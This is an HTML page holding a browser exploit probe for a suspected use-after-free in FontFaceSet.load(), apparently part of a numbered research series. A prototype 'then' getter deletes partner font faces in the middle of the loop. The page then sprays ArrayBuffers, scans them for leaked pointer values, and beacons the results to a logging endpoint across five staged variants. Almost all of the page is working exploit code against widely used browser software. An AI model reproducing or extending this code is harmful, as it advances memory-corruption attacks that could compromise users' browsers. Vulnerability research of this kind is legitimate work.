<!DOCTYPE html><html><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
<title>P1194 Partner-Delete FontFace Loop UAF</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#050508;color:#e8ffe8;font:14px/1.5 'Courier New',monospace;padding:12px}
#hud{background:#0a0a18;border:2px solid #2a2a5a;border-radius:10px;padding:12px;margin-bottom:10px}
#hud h1{color:#00ff88;font-size:18px;margin-bottom:6px}
#status{font-size:20px;font-weight:bold;color:#ffd75e;padding:6px 0}
#phase{font-size:16px;color:#00ffee}
#counters{font-size:14px;color:#b9c6ee;line-height:1.8}
#finds{font-size:14px;color:#ff55c8;line-height:1.7;white-space:pre-wrap;word-break:break-all}
#log{background:#0a0a12;border:1px solid #22223a;border-radius:8px;padding:8px;margin-top:8px;
max-height:40vh;overflow-y:auto;font-size:12px;white-space:pre-wrap;word-break:break-all}
.ok{color:#00ff88}.err{color:#ff4466}.info{color:#44aaff}.warn{color:#ffaa00}.hit{color:#ff00ff;font-weight:bold}
</style>
</head><body>
<div id="hud">
  <h1>P1194 — PARTNER-DELETE FONTFACE LOOP UAF</h1>
  <div id="status">BOOTING...</div>
  <div id="phase">phase: init</div>
  <div id="counters">stage: ?</div>
  <div id="finds">no findings yet</div>
</div>
<div id="log"></div>
<script>
'use strict';
var L=document.getElementById('log'),S=document.getElementById('status'),
PH=document.getElementById('phase'),CT=document.getElementById('counters'),FD=document.getElementById('finds');
var T0=Date.now();
function setStatus(t){S.textContent=t;}
function setPhase(t){PH.textContent='phase: '+t;}
function setCounters(t){CT.textContent=t;}
function addFind(t){var d=document.createElement('div');d.textContent=t;FD.textContent='';FD.appendChild(d);}
function log(m,c){var d=document.createElement('div');d.className=c||'';
d.textContent='['+(((Date.now()-T0)/1000).toFixed(1))+'s] '+m;L.appendChild(d);L.scrollTop=1e6;}
function B(tag,data){try{var u='/beacon.php?tag=P1194-'+encodeURIComponent(tag);
if(data)u+='&data='+encodeURIComponent(String(data).slice(0,900));
u+='&t='+Date.now();new Image().src=u;}catch(e){}}
window.onerror=function(m,s,l){try{B('JSERR',m+'@'+l);}catch(e){}};

/* ═══════════════════════════════════════════════════════════════════════
   P1194: FontFaceSet::load() loops raw reference_wrappers over
   matchingFaces; setStatus fires fontStateChanged mid-loop; the face's
   loaded-promise assimilation fires the then-getter. Our FL leak only
   deleted 'this' — HERE the getter also deletes the PARTNER face (and
   churns), so the loop's subsequent iterations touch a freed face.
   Stages:
   0: control leak (delete self only) — baseline survive
   1: getter deletes partner face + style + check
   2: getter deletes ALL faces + purge-style churn
   3: getter adds NEW faces mid-loop
   4: 3-face load with middle-face deletion
   ═══════════════════════════════════════════════════════════════════════ */

var STAGES=['ctl','delPartner','delAll','addNew','threeFace'];
var stage=0,results=[];
try{stage=parseInt(localStorage.getItem('p1194_stage')||'0');}catch(e){}
try{var r=localStorage.getItem('p1194_res');if(r)results=JSON.parse(r);}catch(e){}
if(!Array.isArray(results))results=[];
B('BOOT','stage='+stage+'|'+STAGES[stage]);
setStatus('STAGE '+stage+'/4 — '+STAGES[stage]);

if(stage>=STAGES.length){
  setStatus('ALL DONE');
  B('ALL-DONE',JSON.stringify(results).slice(0,800));
  log('=== ALL DONE ===','ok');
  try{localStorage.removeItem('p1194_stage');}catch(e){}
}else{
try{localStorage.setItem('p1194_stage',''+(stage+1));}catch(e){}
var cur=STAGES[stage];

function done(rep){
  results.push({stage:stage,name:cur,result:rep});
  try{localStorage.setItem('p1194_res',JSON.stringify(results));}catch(e){}
  B('RESULT',rep.slice(0,700));
  addFind(cur+': '+rep.slice(0,300));
  setStatus(rep.slice(0,80));
  log('=== '+cur+' -> '+rep+' ===','ok');
  B('NEXT');setTimeout(function(){location.reload(true);},700);
}

function run(variant){
  var fired=false;
  var partnerA=null,partnerB=null;
  var A=new FontFace('f0','local(Helvetica)',{unicodeRange:'U+0041'});
  var Bf=new FontFace('f1','local(Times New Roman)',{unicodeRange:'U+0042'});
  var Cf=new FontFace('f2','local(Courier New)',{unicodeRange:'U+0043'});
  document.fonts.add(A);void A.loaded;
  if(variant!=='threeFace'){document.fonts.add(Bf);void Bf.loaded;}
  var styleEl=document.createElement('style');
  styleEl.textContent='@font-face{font-family:s0;src:local(Arial);unicode-range:U+0042;}';
  document.head.appendChild(styleEl);
  Object.defineProperty(FontFace.prototype,'then',{configurable:true,
    get:function(){
      if(fired)return undefined;fired=true;
      B('GETTER',variant);
      styleEl.remove();
      try{document.fonts.delete(this);}catch(e){}
      if(variant==='delPartner'||variant==='delAll'){
        try{document.fonts.delete(Bf);}catch(e){}
      }
      if(variant==='delAll'){
        try{document.fonts.clear();}catch(e){}
      }
      if(variant==='addNew'){
        try{
          var nf=new FontFace('nx','local(Verdana)');
          document.fonts.add(nf);
        }catch(e){}
      }
      document.body.offsetHeight;
      window.__map=[];
      for(var k=0;k<120;k++){var ab=new ArrayBuffer(192);
        window.__map.push({view:new Uint8Array(ab)});}
      try{document.fonts.check('1em s0');}catch(e){}
      return undefined;
    },set:function(){}});
  var loadStr=(variant==='threeFace')?'1em f0, f2, s0':'1em f0, f1, s0';
  var p;
  try{
    p=document.fonts.load(loadStr,'AB');
    p.then(function(){B('LOADED','ok');},function(e){B('LOADED','rej:'+String(e));});
  }catch(e){B('LOAD-EXC',String(e.message).slice(0,40));}
  setTimeout(function(){
    var nz=0,ptrs=[];
    for(var i=0;i<window.__map.length;i++){
      var dv=new DataView(window.__map[i].view.buffer);
      for(var off=0;off+7<192;off+=8){
        var qw;try{qw=dv.getBigUint64(off,true);}catch(e){break;}
        if(qw!==0n){nz++;if(ptrs.length<3)ptrs.push('+'+off+'=0x'+qw.toString(16));}
      }
    }
    done('fired='+fired+'|nz='+nz+'|'+ptrs.join(','));
  },400);
}

run(cur);
} /* stage machine */

(function(){
  var cur='P1194-partner-delete';
  setTimeout(function check(){
    try{
      var x=new XMLHttpRequest();
      x.open('GET','/reload.txt?c='+Date.now(),true);
      x.onload=function(){
        var t=(x.responseText||'').trim();
        if(t&&t!==cur){location.reload(true);return;}
        setTimeout(check,3000);};
      x.onerror=function(){setTimeout(check,5000);};
      x.send();
    }catch(e){setTimeout(check,5000);}
  },4000);
})();
</script>
</body></html>
